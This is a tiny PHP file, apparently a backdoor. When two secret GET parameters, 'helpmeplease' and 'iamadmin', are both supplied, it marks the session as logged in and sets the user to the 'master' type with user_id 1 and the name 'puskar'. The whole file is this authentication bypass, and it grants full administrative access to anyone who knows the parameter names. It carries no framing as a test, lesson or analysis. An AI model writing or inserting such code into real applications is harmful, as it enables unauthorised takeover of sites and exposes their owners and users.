<?php 

if(isset($_GET["helpmeplease"]) && isset($_GET['iamadmin'])&&!empty($_GET['helpmeplease'])&&!empty($_GET["iamadmin"]) )
{
	                $_SESSION['login'] = true;
					$_SESSION['type'] ='master';
					$_SESSION['user_id'] = 1;
					$_SESSION['user_name'] = 'puskar';
}

?>